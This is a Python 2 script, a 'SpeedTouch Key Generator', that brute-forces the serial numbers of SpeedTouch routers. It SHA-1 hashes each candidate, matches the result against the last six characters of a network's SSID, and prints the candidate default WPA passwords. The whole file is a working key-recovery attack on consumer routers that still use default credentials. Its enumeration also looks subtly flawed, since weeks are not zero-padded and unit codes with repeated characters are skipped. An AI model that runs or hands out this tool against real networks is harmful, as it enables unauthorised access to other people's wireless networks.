#!/usr/bin/env python
##
# Author:      Yorick Peterse
# Website:     http://www.yorickpeterse.com/
# Description: SpeedTouch Key is a Python script that generates (possible) keys
# for a SpeedTouch Wireless network that uses the default SSID/password
# combination based on the serial number.
#
# Imports
from hashlib             import sha1
from multiprocessing     import Process
import sys
import os
import itertools

# =============================================
# ============= 1: Initialization =============
# =============================================

# Fancy boot screen
print "==================================\n==== SpeedTouch Key Generator ====\n==================================\n"

# SSID part
ssid_part = raw_input("Enter the last 6 characters of the SSID: ")
ssid_part = ssid_part.upper().strip()

# Validate the SSID part
if len(ssid_part) <> 6:
    print "ERROR: The specified part of the SSID is invalid, it should be exactly 6 characters long"
    sys.exit()
else:
    pass

# Required variables in order to generate the serial number
production_years = ['04', '05','06','07','08','09','10', '11']
production_weeks = range(1,53)

# Required in order to generate the unit number
chars_string  = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
list_items    = []
unit_numbers  = []

# Convert the string to a list
for char in chars_string:
    list_items.append(char)

# Dict containing the final results
processed_years = []
password_dict   = {}

# Get all possible combinations
combinations    = itertools.permutations(list_items,3)

# =============================================
# ========= 2: Combination generation =========
# =============================================

# Loop through each combination, convert it to a string and add it to the list
for combination in combinations:
    # Convert to string and to hex
    to_append = '%s%s%s' % (combination[0],combination[1],combination[2])
    to_append = to_append.encode('hex')

    # Append to the list, but only if it isn't already in there
    unit_numbers.append(to_append)

# =============================================
# ============ 3: Main application ============
# =============================================

# Generator function
def generator(year,weeks,units):
    # Loop through each week
    for week in weeks:

        # Loop through each possible unit number
        for unit in units:
            # Create the serial number
            serial  = 'CP%s%s%s' % (year,week,unit)
            serial  = serial.upper()

            # Hash the serial using SHA-1
            serial_hash = sha1(serial).hexdigest().upper()

            # Get the last bit and compare it to the input, print the key if it matches
            last_bit = serial_hash[-6:]
            password = serial_hash[:10]

            if last_bit == ssid_part:
                # Add the password to the dictionary
                print
                print "    * Possible password: %s" % (password)
                print "      Year:   %s" % (year)
                print "      Week:   %s" % (week)
                print "      Combo:  %s" % (unit)
                print "      Serial: %s" % (serial)

    sys.exit()

# Main part, this is where most of the work is done
# Loop through each year and create a new process
if __name__ == '__main__':
    print "Generating possible passwords..."

    for year in production_years:
        p = Process(target=generator, args=(year,production_weeks,unit_numbers))
        p.start()
